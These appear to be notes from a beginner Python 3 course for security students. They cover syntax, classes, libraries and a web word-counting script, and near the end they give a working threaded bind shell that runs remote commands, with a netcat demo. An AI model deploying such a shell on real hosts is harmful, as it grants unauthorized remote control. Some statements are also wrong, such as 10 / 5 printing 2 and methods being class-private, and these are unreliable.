## Introduction to Python 3 : 

Python is an `interpreted language`, which means the code itself is not compiled into machine code like C code. Instead, it is interpreted by the Python program, and the instructions in the script(s) are executed. Python is a high-level language meaning the scripts we produce are simplified for our convenience so that we do not need to worry about memory management, system calls, and so forth.

## Executing Python Code : 

There are many ways to execute a piece of Python code. Two of the most frequently used methods are running the code from a `.py` file and running it directly inside the Python [IDLE](https://docs.python.org/3/library/idle.html), Integrated Development and Learning Environment.

```shell
NolanCarougeHTB@htb[/htb]$ vim welcome.py
NolanCarougeHTB@htb[/htb]$ python3 welcome.py

Hello Academy!
```

```shell
Python 3.9.0 (default, Oct 27 2020, 14:15:17) 
[Clang 12.0.0 (clang-1200.0.32.21)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> 4 + 3
7
>>> foo = 3 * 5
>>> foo
15
>>> foo + 4
19
>>> print('Hello Academy!')
Hello Academy!
>>> exit(0)
```

Another method is based on adding the [shebang](https://en.wikipedia.org/wiki/Shebang_%28Unix%29#Portability) (`#!/usr/bin/env python3`) in the first line of a Python script. On Unix-based operating systems, marking this with a pound sign and an exclamation mark causes the following command to be executed along with all of the specified arguments when the program is called.

```python
#!/usr/bin/env python3
```

```shell
NolanCarougeHTB@htb[/htb]$ chmod +x welcome.py
NolanCarougeHTB@htb[/htb]$ ./welcome.py
```

## Introduction to Variables : 

```python
advice = "Don't panic"
ultimate_answer = 42
potential_question = 6 * 7
confident = True
something_false = False
problems = None
# Oh, and by the way, this is a comment. We can tell by the leading # sign.
```

- The first variable, `advice`, is a `string`. Strings in Python can be specified using both `"double quotes"` and `'single quotes'`
- Ultimate_answern the first variable, is a number. The second variable, `potential_question`, is also a number but not until `runtime`. During runtime, the equation `6 * 7` is evaluated to `42`, which is then stored as the variable.
- A boolean value is a truth value and can be either `True` or `False`.
- Right after comes the variable `problems`, which is set to `None`. [None](https://realpython.com/null-in-python/#:~:text=Python%20uses%20the%20keyword%20None,and%20a%20first%2Dclass%20citizen!) is a special "nothingness" of a value similar to `null` in other languages.
- Comments work the same way in Python as they do in all other languages: they are ignored when the program runs and are only for the developers' eyes.

Let us first briefly go through some basic math operations with Python.

```python
>>> 10 + 10		# Addition
20
>>> 20 - 10		# Subtraction
10
>>> 5 * 5		# Multiplication
25
>>> 10 / 5		# Division
2
```

For all of these values we can define variables to store them. As for the name itself, we can name them as we please, however with a few exceptions e.g. they must begin with a letter or `_`.

```python
>>> add = 10 + 10
>>> sub = 20 - 10
>>> multi = 5 * 5
>>> div = 10 / 5
>>>
>>> print(add, sub, multi, div)
20 10 25 2
```

This also allows us to work with the values stored in the individual variables.

```python
...SNIP...
>>> print(add, sub, multi, div)
20 10 25 2
>>> result = (add * sub) - (multi * div)		# (20 * 10) - (25 * 2)
>>> print('Result: ', result)
Result:  150
```

Another handy feature of the Python interpreter is that the IDLE assigns the latest expression to the variable `_`. This allows us to continue working with the last value.

```python
>>> 38 + 4
42
>>> 50 - _		# 50 - 42
8
```

In Python, variable names follow the [snake_case](https://en.wikipedia.org/wiki/Snake_case) naming convention. This means that variable names should be all lower case initially, and an underscore should separate any potential need for multiple words in the name.
There are even several style guides for Python, such as [PEP8](https://www.python.org/dev/peps/pep-0008/#type-variable-names), which describes certain types of variable or function definitions.

## Conditional Statements and Loops :

Below is an example of what an if/else `block` of code looks like, i.e., the amount of code that constitutes a particular technique and is visually grouped (typically indented at the same level).

```python
happy = True

if happy:
    print("Happy and we know it!")
else:
    print("Not happy...")
```

Besides indentations, two new keywords are used here: `if` and `else`. First, we define a variable which, for the sake of demonstration, is currently TRUE. Then we check `if` the variable `happy` is `True` (`if some_var` is easier to read but also shorthand for `if some_var == True`), and if it is `True`, then we print "Happy and we know it!" to the terminal. If `happy` is `not` `True`, i.e., it is `False`, then the `else` block is executed instead, and "Not happy..." is printed to the terminal.

The `elif` (else-if) expression means that we continue with this one if the previous condition is not met. Basically, `elif` is the shortened notation of nested `if` statements.

```python
happy = 2

if happy == 1:
    print("Happy and we know it!")
elif happy == 2:
    print("Excited about it!")
else:
    print("Not happy...")
```

This brings us to the first type of loop: the `while-loop`. Consider the below code :

```python
counter = 0

while counter < 5:
    print(f'Hello #{counter}')
    counter = counter + 1
```

A while-loop is a loop that will execute its content (the "block") as long as the defined condition is `True`. This means that `while True` will run forever, and `while False` will never run.

While a regular string could look something like `'Hello world'`, an f-string adds an `f` at the beginning: `f'Hello world'`. These particular two strings are of the same value. The benefit of the f-string, however, is that we can swap out parts of the strings with other values and variables by enclosing them in a pair of curly braces, like this :

```python
equation = f'The meaning of life might be {6 * 7}.'  # -> The meaning of life might be 42.

me = 'Birb'
greeting = f'Hello {me}!'  # -> Hello Birb!
```

This section will look at one kind of loops often referred to as the "for-each loop". This is a loop that iterates over `each element` in some collection of elements and does something `for each` individual element.

```python
groceries = [
    'Walnuts',    # index 0
    'Grapes',     # index 1
    'Bird seeds'  # index 2
]

for food in groceries:
    print(f'I bought some {food} today.')
```
```shell
NolanCarougeHTB@htb[/htb]$ python3 groceries.py

I bought some Walnuts today.
I bought some Grapes today.
I bought some Bird seeds today.
```

Strings can also be indexed. This is especially useful when we want to filter out certain parts of some output.

```python
>>> var = "ABCDEF"
>>> print(var[0], var[1], var[2], var[3], var[4], var[5])
A B C D E F
>>> print(var[-1], var[-2], var[-3], var[-4], var[-5], var[-6])
F E D C B A
```

We can also work with these indexes to give us particular substrings.

```python
>>> var = "ABCDEF"
>>> print(var[:2])	# Up to index 2
AB
>>> print(var[2:])	# Ignore everything up to index 2
CDEF
>>> print(var[2:4])	# Everything between index 2 and 4 ("2" is counted)
CD
>>> print(var[-2:])	# Up to negative index 2 (last two characters)
EF
```

## Defining Functions : 

```python
wordlist = ['password', 'john', 'qwerty', 'admin']

for word in wordlist:
    counter = 0
    while counter < 100:
        print(f'{word}{counter}')
        counter = counter + 1
```

In this case, the for-loop repeats the loop until it has processed all entries from the list. As shown, even with simple building blocks, we can achieve a lot. Let us talk about the following important building block in software: `Functions`

Functions let us define code blocks that perform a range of actions, produce a range of values, and optionally return one or more of these values. Like in math, where `f(x)` is a `function f of x` and produces the same result when given the same input. For example `f(x) = x + 1` is a function `f` of `x` which returns `x + 1`. Thus `f(2)` would be `3`, because `f(2) = 2 + 1` which is `3`.

Here is an example of defining `f(x) = 2 * x + 5` as a function in Python :

```python
def f(x):
    return 2 * x + 5
```

The `def` keyword is how we define functions in Python. Following `def` comes the function name (written in snake_case), input parameters inside the parentheses, and a colon.

Let us create a function to calculate and return that one value to the power of another value :

```python
def power_of(x, exponent):
    return x ** exponent
```

Let us look at an example. Consider the below function, which is a template invitation to a school event.

```python
def print_sample_invitation(mother, father, child, teacher, event):

    # Notice here the use of a multi-line format-string: f''' text here '''
    sample_text = f'''
Dear {mother} and {father}.
{teacher} and I would love to see you both as well as {child} at our {event} tomorrow evening. 

Best regards,
Principal G. Sturgis.
'''
    print(sample_text)
```

```python
print_sample_invitation(mother='Karen', father='John', child='Noah', teacher='Tina', event='Pizza Party')
```

```shell
NolanCarougeHTB@htb[/htb]$ python3 invitation.py

Dear Karen and John.
Tina and I would love to see you both as well as Noah at our Pizza Party tomorrow evening.

Best regards,
Principal G. Sturgis.
```

Keep in mind the scopes of the code. Scopes let us reference variables and functions `outside` of our current scope (e.g., code in functions can use variables and the global scope), but not `inside` of it. In other words, we cannot reuse a variable we defined inside a function, outside of it. Besides that, Python comes with many different [Built-in Functions](https://docs.python.org/3/library/functions.html).

## Making Code Classy : 

A `class` is a spec of how an object of some type is produced. The result of `instantiating` such a `class` is an object of the class. Let us look at an example :

```python
class DreamCake:
    # Measurements are defined in grams or units
    eggs = 4
    sugar = 300 
    milk = 200
    butter = 50
    flour = 250
    baking_soda = 20
    vanilla = 10

    topping = None
    garnish = None

    is_baked = False

    def __init__(self, topping='No topping', garnish='No garnish'):
        self.topping = topping
        self.garnish = garnish
    
    def bake(self):
        self.is_baked = True

    def is_cake_ready(self):
        return self.is_baked
```

Classes are defined using the `class` keyword. followed by the name of the class, in the CapWords naming convention. CapWords means all words used in the name are capitalized and squeezed together, like `CapWordsArePrettyCool`. 

Next up come the ingredients that produce a basic (and tasty, by the way) cake, which will never change in this example. The `topping` and `garnish` variables are set to `None` right after space.

Please notice about the `__init__` function, the `self` parameter. This parameter is a `mandatory, first` parameter of `all` class functions.

Another little trick to notice is the default values for function parameters. These allow us to completely commit specifying a value for one or more of the parameters. The parameters will - in that case - then be set to their default values as specified, and `topping` is set to `'No topping'` unless overridden when we create an object.

Lastly, in this example, we have defined a function `inside of the class scope` as dictated by the indentation level. This means that the function `bake` is `only` accessible to code from within the class itself.

```python
plain_cake = DreamCake()
chocolate_cake = DreamCake(topping='Chocolate frosting')
luxury_strawberry_cake = DreamCake(topping='Strawberry frosting', garnish='Chocolate bits')
luxury_strawberry_cake = DreamCake('Strawberry frosting', 'Chocolate bits')
```

```python
>>> class Circle:
...     def __init__(self, radius):
...         self.radius = radius
...
...     def __str__(self):
...         return f'Circle(r={self.radius})'
...
>>> my_circle = Circle(5)
>>> str(my_circle)
'Circle(r=5)'
```

If we did not override the `__str__` function, the code would still work, but the output would be less meaningful:

```python
'<__main__.Circle object at 0x022FFB98>'
```

Another two Magic Methods worth mentioning are the `__enter__` and `__exit__` functions, allowing us to create classes that support using the `with` keyword. Let us briefly consider an example before moving on to the next section of the module.

```python
class Foo():

    def __enter__(self):
        print("Enter...")

    def __exit__(self, type, value, traceback):
        print("...and exit.")
```

This allows us to use the `with` clause to "wrap" this supposed reused boilerplate code around concrete code, for example:

```python
with Foo():
    print("Hello world!")
```

This prints the following to the console:

```shell-session
Enter...
Hello world!
...and exit.
```

## Introduction to Libraries : 

We have discussed how to create classes and functions, functions within classes, and other simple concepts. All of this has been inside one Python file, also known as `a module`, but it would be great if we could share the code inside this module with other people or reuse it in other projects.

A `library` in programming is in many ways similar to a library in real life. It is a collection of knowledge that we can borrow in our projects without reinventing the wheel. Once we `import` a library, we can use everything inside it, including functions and classes.

Some libraries ship along with Python, for example, `datetime`, which lets us get an object representing the current, local date, and time.
Let us see what classes and functions the library `datetime` contains. For that, we will use the built-in function called [dir()](https://docs.python.org/3/library/functions.html#dir).

```python
>>> import datetime
>>> dir(datetime)
['MAXYEAR', 'MINYEAR', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'date', 'datetime', 'datetime_CAPI', 'sys', 'time', 'timedelta', 'timezone', 'tzinfo']
```

```python
import datetime

now = datetime.datetime.now()
print(now)  # Prints: 2021-03-11 17:03:48.937590
```

```python
from datetime import datetime

print(datetime.now())
```

```python
from datetime import datetime as dt

print(dt.now())
```

## Managing Libraries in Python : 

The most popular way of installing external packages in Python is by using [pip](https://pip.pypa.io/en/stable/). According to the author, `pip` is short for ["pip installs packages"](https://ianbicking.org/blog/2008/10/pyinstall-is-dead-long-live-pip.html), a recursive abbreviation (meaning the definition refers to the abbreviation, and thus circles itself). With `pip`, we can install, uninstall and upgrade Python packages.

Some valuable arguments for `pip` that we will look at are `install` and`--upgrade` flag, `uninstall` and `freeze`.

```shell
NolanCarougeHTB@htb[/htb]$ # Syntax: python3 -m pip install [package]
NolanCarougeHTB@htb[/htb]$ python3 -m pip install flask
```

```shell
NolanCarougeHTB@htb[/htb]$ python3 -m pip install --upgrade flask
```

```shell
NolanCarougeHTB@htb[/htb]$ pip uninstall [package]
```

Let us see what is currently installed by running `pip` with the `freeze` argument.

```shell
NolanCarougeHTB@htb[/htb]$ # Syntax: python3 -m pip freeze [package]
NolanCarougeHTB@htb[/htb]$ python3 -m pip freeze

click==7.1.2
Flask==1.1.2
itsdangerous==1.1.0
Jinja2==2.11.3
MarkupSafe==1.1.1
protobuf==3.13.0
pynput==1.7.3
pyobjc-core==7.1
pyobjc-framework-Cocoa==7.1
pyobjc-framework-Quartz==7.1
six==1.15.0
Werkzeug==1.0.1
```

This list of installed packages would be nice to be given to another person to either use our scripts or help with development. This way, they will know which packages need to be installed (and which versions even).

It just so happens to be the case that `pip` supports maintaining packages from a requirements file. This file, often called literally `requirements.txt`, contains a list of all the required packages needed to run the script successfully. The format is quite simple. We would copy the above `freeze` output and save it as a requirements file.

```shell
NolanCarougeHTB@htb[/htb]$ python3 -m pip install -r requirements.txt
```

## The Importance of Libraries : 

Now that we know how important libraries can be for our development and how to manage them let us discuss two of the more popular ones that we will use in our project, starting with the `requests` library.

The [requests](https://requests.readthedocs.io/en/master/) library is an elegant and simple HTTP library for Python.

```shell
NolanCarougeHTB@htb[/htb]$ python3 -m pip install requests
```

The two most useful things to know about the requests library are making HTTP requests, and secondly, it has a `Session` class, which is useful when we need to maintain a certain context during our web activity.

```python
import requests

resp = requests.get('http://httpbin.org/ip')
print(resp.content.decode())

# Prints:
# {
#   "origin": "X.X.X.X"
# }
```

Another handy package is the BeautifulSoup library (rather `beautifulsoup4`). This library makes working with HTML a lot easier in Python.

```shell
NolanCarougeHTB@htb[/htb]$ python3 -m pip install beautifulsoup4
```

```html
<html>
<head><title>Birbs are pretty</title></head>
<body><p class="birb-food"><b>Birbs and their foods</b></p>
<p class="food">Birbs love:<a class="seed" href="http://seeds" id="seed">seed</a>
   and 
   <a class="fruit" href="http://fruit" id="fruit">fruit</a></p>
 </body></html>
```

This HTML looks a little messy. We will assume that this HTML is stored in a variable `html_doc`. We'll then load this into BeautifulSoup and print it in a nicely formatted way, as follows :

```python
from bs4 import BeautifulSoup

html_doc = """ html code goes here """
soup = BeautifulSoup(html_doc, 'html.parser')
print(soup.prettify())
```

```html
<html>
 <head>
  <title>
   Birbs are pretty
  </title>
 </head>
 <body>
  <p class="birb-food">
   <b>
    Birbs and their foods
   </b>
  </p>
  <p class="food">
   Birbs love:
   <a class="seed" href="http://seeds" id="seed">
    seed
   </a>
   and
   <a class="fruit" href="http://fruit" id="fruit">
    fruit
   </a>
  </p>
 </body>
</html>
```

## The First Iterations : 

In short, this is what we should be aiming for:

- The code will download and print the entire HTML of a webpage.
- The URL of the webpage is fixed inside the code.
- We will write the code in its simplest form and rewrite bits and pieces as needed when we need to.
- We will use the `requests` library.

```python
import requests

PAGE_URL = 'http://target:port'

resp = requests.get(PAGE_URL)
html_str = resp.content.decode()
print(html_str)
```

Now, what happens if we misspell the URL ? Let's try it out in our Python interactive terminal and see :

```python
>>> r = requests.get('http://target:port/missing.html')
>>> r.status_code

404
>>> print(r.content.decode())

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
    </body>
</html>
```

There are no products on this error page ! Whoops. Let us implement a simple fail check that makes sure we do not try to work with broken links.

```python
import requests

PAGE_URL = 'http://target:port'

resp = requests.get(PAGE_URL)

if resp.status_code != 200:
    print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
    exit(1)

html_str = resp.content.decode()
print(html_str)
```

Now though, we have some code that does something, but it is not in a function. To avoid cluttering the code, it is advisable to keep things `simple` and `separate`, so let us go ahead and `refactor` the code, that is, let us change and thus improve the code.

```python
import requests

PAGE_URL = 'http://target:port'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

print(get_html_of(PAGE_URL))
```

We want to:

- Find all words on the page, ignoring HTML tags and other metadata.
- Count the occurrence of each word and note it down.
- Sort by occurrence.
- Do something with the most frequently occurring words, e.g., print them.

How do we find all words on the page, ignoring HTML tags and other metadata? This is where BeautifulSoup comes into play. A quick look at the documentation (https://www.crummy.com/software/BeautifulSoup/bs4/doc/) shows that we can call the `get_text()` BeautifulSoup object to get all of the text on the webpage as a string.

The first step was to find all words in the HTML while ignoring HTML tags. If we use the `get_text()` function we discussed earlier, we can use the `regular expression` module `re` to help us. This module has a `findall` function which takes some string of `regex` (shorthand for "`reg`gular `ex`pression") and some text as parameters and then returns all occurrences in a list.

```python
import requests
import re
from bs4 import BeautifulSoup

PAGE_URL = 'http://target:port'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

html = get_html_of(PAGE_URL)
soup = BeautifulSoup(html, 'html.parser')
raw_text = soup.get_text()
all_words = re.findall(r'\w+', raw_text)
```

One new addition to the mix is the `r'...'` string. This is a `r`aw string, meaning Python should assume that characters inside the string are the actual characters to use. Normally a `\` is used as an `escape-character`, which helps us define special characters - or bytes rather - for example, the `\n` or `\t`, the new line and tab characters, respectively.

The `all_words` variable is, assuming everything goes well, a list of all the words from the webpage in order of occurrence and including duplicates. We will next loop through this list and count each word. One way to achieve that is this below piece of code:

```python
# Previous code omitted
all_words = re.findall(r'\w+', raw_text)

word_count = {}

for word in all_words:
    if word not in word_count:
        word_count[word] = 1
    else:
        current_count = word_count.get(word)
        word_count[word] = current_count + 1
```

To get a sorted list of the words so that we can focus on the most occurring ones, we either magically come up with the below piece of code or - more realistically - we Google for help ("python sort dictionary by values" and similar search terms) and find the below answer.

```python
top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)
```

We can finally print the top-10 words like so :

```python
>>> top_words = sorted(word_count.items(), key=lambda item: item[1], reverse=True)
>>> for i in range(10):
...    print(top_words[i])

('foo', 6)
('bar', 5)
('bas', 5)
('hello', 4)
('academy', 4)
('birb', 1)
```

## Continuously Improving The Code : 

At this point, we have a working Python script that will extract words from a webpage and print the top-10 most occurring ones to the console.

Alternatively, we could _refactor_ the current code and move the word counting part into its function.

```python
def count_occurrences_in(word_list):
    word_count = {}
    for word in word_list:
        if word not in word_count:
            word_count[word] = 1
        else:
            current_count = word_count.get(word)
            word_count[word] = current_count + 1
    return word_count
```

Notice how we added an input parameter and replaced the list of words to iterate over to this new `word_list` parameter. We also added a `return statement` at the bottom so that our function can give back the result. We can do the same for the code that currently acts like glue in our script :

```python
def get_all_words_from(url):
    html = get_html_of(url)
    soup = BeautifulSoup(html, 'html.parser')
    raw_text = soup.get_text()
    return re.findall(r'\w+', raw_text)

all_words = get_all_words_from(PAGE_URL)
```

If we perform the same exercise for the remaining code, we get this :

```python
import requests
import re
from bs4 import BeautifulSoup

PAGE_URL = 'http://target:port'

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

def count_occurrences_in(word_list):
    word_count = {}

    for word in word_list:
        if word not in word_count:
            word_count[word] = 1
        else:
            current_count = word_count.get(word)
            word_count[word] = current_count + 1
    return word_count

def get_all_words_from(url):
    html = get_html_of(url)
    soup = BeautifulSoup(html, 'html.parser')
    raw_text = soup.get_text()
    return re.findall(r'\w+', raw_text)

def get_top_words_from(all_words):
    occurrences = count_occurrences_in(all_words)
    return sorted(occurrences.items(), key=lambda item: item[1], reverse=True)

all_words = get_all_words_from(PAGE_URL)
top_words = get_top_words_from(all_words)

for i in range(10):
    print(top_words[i][0])
```

## Further Improvements : 

Recall what we discussed in the beginning about importing modules and that Python scripts are executed from top to bottom, even when imported. This means that if somebody were to import our script, e.g., reuse some of our functions (it could be ourselves), the code would run as soon as imported. The typical way to avoid this is to put all the code that `does something` into the "main" block. Let us do that :

```python
if __name__ == '__main__':
    page_url = 'http://target:port'
    the_words = get_all_words_from(page_url)
    top_words = get_top_words_from(the_words)

    for i in range(10):
        print(top_words[i][0])
```

Let us look at one module : [click](https://click.palletsprojects.com).

```python
import click

@click.command()
@click.option('--count', default=1, help='Number of greetings.')
@click.option('--name', prompt='Your name', help='The person to greet.')
def hello(count, name):
    for i in range(count):
        click.echo('Hello %s!' % name)

if __name__ == '__main__':
    hello()
```

First of all, there are the `decorators` which, in a sense, "decorate functions." These are the things about the function definition that start with an `@`.

```cmd-session
C:\Users\Birb> python click_test.py

Your name: Birb
Hello Birb!
```

```cmd-session
C:\Users\Birb> python click_test.py --help

Usage: click_test.py [OPTIONS]

Options:
  --count INTEGER  Number of greetings.
  --name TEXT      The person to greet.
  --help           Show this message and exit.
```

```python
import click
import requests
import re
from bs4 import BeautifulSoup

def get_html_of(url):
    resp = requests.get(url)

    if resp.status_code != 200:
        print(f'HTTP status code of {resp.status_code} returned, but 200 was expected. Exiting...')
        exit(1)

    return resp.content.decode()

def count_occurrences_in(word_list, min_length):
    word_count = {}

    for word in word_list:
        if len(word) < min_length:
            continue
        if word not in word_count:
            word_count[word] = 1
        else:
            current_count = word_count.get(word)
            word_count[word] = current_count + 1
    return word_count

def get_all_words_from(url):
    html = get_html_of(url)
    soup = BeautifulSoup(html, 'html.parser')
    raw_text = soup.get_text()
    return re.findall(r'\w+', raw_text)

def get_top_words_from(all_words, min_length):
    occurrences = count_occurrences_in(all_words, min_length)
    return sorted(occurrences.items(), key=lambda item: item[1], reverse=True)

@click.command()
@click.option('--url', '-u', prompt='Web URL', help='URL of webpage to extract from.')
@click.option('--length', '-l', default=0, help='Minimum word length (default: 0, no limit).')
def main(url, length):
    the_words = get_all_words_from(url)
    top_words = get_top_words_from(the_words, length)

    for i in range(10):
        print(top_words[i][0])

if __name__ == '__main__':
    main()
```

## A Simple Bind Shell : 

A bind shell is at its core reasonably simple. It is a process that binds to an address and port on the host machine and then listens for incoming connections to the socket. When a connection is made, the bind shell will - repeatedly - listen for bytes being sent to it and treat them as raw commands to be executed on the system in a subprocess. A very naive implementation of such a bind shell is this :

```python
import socket
import subprocess
import click

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)
    client_socket, address = s.accept()

    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

if __name__ == '__main__':
    main()
```

```cmd-session
C:\Users\Birb\Desktop\python> python bindshell.py --port 4444
```

```shell
NolanCarougeHTB@htb[/htb]$ nc 10.10.10.10 4444 -nv

(UNKNOWN) [10.10.10.10] 4444 (?) open

whoami
localnest\birb

hostname
LOCALNEST

dir 
Volume in drive C has no label.
 Volume Serial Number is 966B-6E6A

 Directory of C:\Users\Birb\Desktop\python

20-03-2021  21:22    <DIR>          .
20-03-2021  21:22    <DIR>          ..
20-03-2021  21:22               929 bindshell.py
               1 File(s)            929 bytes
               2 Dir(s)  518.099.636.224 bytes free
exit
```

By simply extracting the code that handles command execution to its function, it is possible to make the bind shell first listen for a new connection, spawn a thread for that connection that handles command execution, and finally start over listening to new incoming connections.

```python
import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()
```

## Managing Libraries in Python (Continued) : 

At this point, we have used multiple packages in our projects and even installed third-party packages. These packages physically exist in a predetermined location so that the Python interpreter can locate the packages when we try to import them or elements from inside of them.
The default `site-packages`/`dist-packages` locations are the following:

- Windows 10: `PYTHON_INSTALL_DIR\Lib\site-packages`:
- Linux: `/usr/lib/PYTHON_VERSION/dist-packages/`:

Python already knows to check this location when searching for packages. This is not always practical. However, we can tell Python to look in a different directory before searching through the site-packages directory by specifying the `PYTHONPATH` environment variable. As we can see below, without having set a `PYTHONPATH` environment variable, the search path includes only the standard directories :

```shell
NolanCarougeHTB@htb[/htb]$ python3

Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages', '/usr/lib/python3.9/dist-packages']

>>>
```

```shell
NolanCarougeHTB@htb[/htb]$ PYTHONPATH=/tmp/ python3

Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/tmp/', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages', '/usr/lib/python3.9/dist-packages']

>>>
```

Suppose we wanted to have the packages installed in a specific folder. For example, we wanted to keep all packages related to us inside some `/var/www/packages/` directory. In that case, we can have pip install the package and store the content inside this folder with the `--target` flag, like so :

```shell
NolanCarougeHTB@htb[/htb]$ python3 -m pip install --target /var/www/packages/ requests
```

So far, we have looked at installing packages onto the local machine, making packages available to all scripts in our system. One solution for this kind of isolation of projects is using `virtual environments` or `venv` for short.

```shell
NolanCarougeHTB@htb[/htb]$ python3 -m venv academy
```

Next up, we can source the `activate` script located in `academy/bin/`. This configures our shell by setting up the required environment variables so that when we, for example, run `pip install requests`, we will be using the Python binary that was copied as part of creating the virtual environment, like so :

```shell
Fugl@htb[/htb]$ source academy/bin/activate
(academy) Fugl@htb[/htb]$ pip install requests
```




